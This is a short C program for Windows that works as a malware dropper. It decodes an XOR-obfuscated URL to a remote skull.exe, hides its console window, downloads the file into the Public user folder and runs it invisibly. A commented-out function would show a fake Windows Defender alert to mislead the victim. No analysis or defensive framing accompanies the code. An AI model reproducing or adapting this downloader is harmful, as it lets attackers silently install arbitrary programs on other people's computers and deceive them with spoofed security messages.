#include <stdio.h>
#include <windows.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

void x03f_4l3b0x();

int main(){

    //file source and destination paths
    //Sleep(30000);
    const char x03f_0e3f[] = {0x23, 0x3f, 0x3f, 0x3b, 0x38, 0x71, 0x64, 0x64, 0x2c, 0x22, 0x3f, 0x23, 0x3e, 0x29, 0x65, 0x28, 0x24, 0x26, 0x64, 0x7b, 0x33, 0x78, 0x33, 0x3b, 0x64, 0x08, 0x66, 0x0a, 0x39, 0x3f, 0x38, 0x64, 0x39, 0x2e, 0x27, 0x2e, 0x2a, 0x38, 0x2e, 0x38, 0x64, 0x2f, 0x24, 0x3c, 0x25, 0x27, 0x24, 0x2a, 0x2f, 0x64, 0x0a, 0x39, 0x3f, 0x38, 0x64, 0x38, 0x20, 0x3e, 0x27, 0x27, 0x65, 0x2e, 0x33, 0x2e};
    const char *x03f_0e4f = "C:\\Users\\Public\\SKULL.exe";

    int x03f_l3n = sizeof(x03f_0e3f);
    char x03f_l3Y = 'K';
    char x03f_0e5f[256];

    for (int i = 0; i < x03f_l3n; i++) {
        x03f_0e5f[i] = x03f_0e3f[i] ^ x03f_l3Y;
    }
    x03f_0e5f[x03f_l3n] = '\0';

    HWND stealth;
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    HRESULT hr = URLDownloadToFile(NULL, x03f_0e5f, x03f_0e4f, 0, NULL); //window=NULL, fileURL, filePath, 0(reserved), progress=NULL

    if(SUCCEEDED(hr)){
        WinExec(x03f_0e4f, SW_HIDE);
    }
    else {
        printf("Download failed. HRESULT: %08X\n", hr);
        x03f_4l3b0x();
    }

    return 0;
}

/*void x03f_4l3b0x(){
    MessageBoxW(NULL, L"Windows Defender has blocked this application because it detected malicious behavior.", L"Windows Security", MB_OK | MB_ICONERROR);
};*/

/*void x03f_c4l4l3b0x(){
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    wchar_t cmd[] = L"notepad.exe";

    if(CreateProcessW(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)){
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else{
        MessageBoxW(NULL, L"Can't open notepad.exe.", L"Error", MB_OK | MB_ICONERROR);
    };
};*/